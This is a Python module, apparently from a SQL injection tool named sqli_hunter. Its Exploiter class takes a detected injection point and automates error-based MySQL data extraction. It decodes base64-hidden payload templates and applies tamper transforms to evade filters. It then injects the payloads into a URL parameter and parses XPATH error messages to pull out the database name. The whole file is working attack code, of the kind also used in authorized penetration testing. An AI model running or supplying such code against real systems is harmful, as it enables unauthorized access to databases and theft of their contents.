# -*- coding: utf-8 -*-
"""
Exploitation Engine.

This module contains the logic to extract data from a target once a
vulnerability has been identified.
"""
import httpx
import re
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from sqli_hunter.payloads import EXTRACTION_PAYLOADS_B64, EXTRACTION_QUERIES_B64
from sqli_hunter.tamper import apply_tampers

class Exploiter:
    """
    Handles the data extraction process after a vulnerability is found.
    """
    def __init__(self, client: httpx.AsyncClient):
        self.client = client

    async def extract_data_error_based(self, vuln_details: dict, tampers: list[str]):
        """
        Attempts to extract data using an error-based SQLi vulnerability.

        :param vuln_details: A dictionary containing details of the found vulnerability.
        """
        print("\n[bold cyan]--- Starting Exploitation ---[/bold cyan]")
        print(f"[*] Exploiting error-based vulnerability at: {vuln_details['url']}")

        original_url = vuln_details['url']
        param_name = vuln_details['parameter']

        # We need to reconstruct the URL without the original payload
        parsed_url = urlparse(original_url)
        query_params = parse_qs(parsed_url.query)
        # The value might contain the payload, let's strip it. This is a simplification.
        original_value = query_params[param_name][0].rstrip("'\"`\\")

        # Let's try to get the database name first
        query_b64 = EXTRACTION_QUERIES_B64.get("database_name")
        if not query_b64:
            print("[!] No 'database_name' query found in payloads.")
            return

        query = base64.b64decode(query_b64).decode('utf-8')

        payload_templates_b64 = EXTRACTION_PAYLOADS_B64.get("error_based_mysql", [])

        for template_b64 in payload_templates_b64:
            template = base64.b64decode(template_b64).decode('utf-8')
            payload = template.format(query=query)

            tampered_payload = apply_tampers(payload, tampers)

            injected_params = query_params.copy()
            injected_params[param_name] = original_value + tampered_payload
            injected_url = urlunparse(parsed_url._replace(query=urlencode(injected_params, doseq=True)))

            try:
                response = await self.client.get(injected_url, timeout=10)
                # Regex to find our data within the error message, e.g., ~databasename~
                match = re.search(r"XPATH syntax error: '~(\w+)~'", response.text)
                if match:
                    extracted_data = match.group(1)
                    print(f"[bold green][+] SUCCESS: Extracted Database Name: {extracted_data}[/bold green]")
                    return extracted_data
            except httpx.RequestError:
                continue

        print("[!] Failed to extract data using error-based techniques.")
        return None
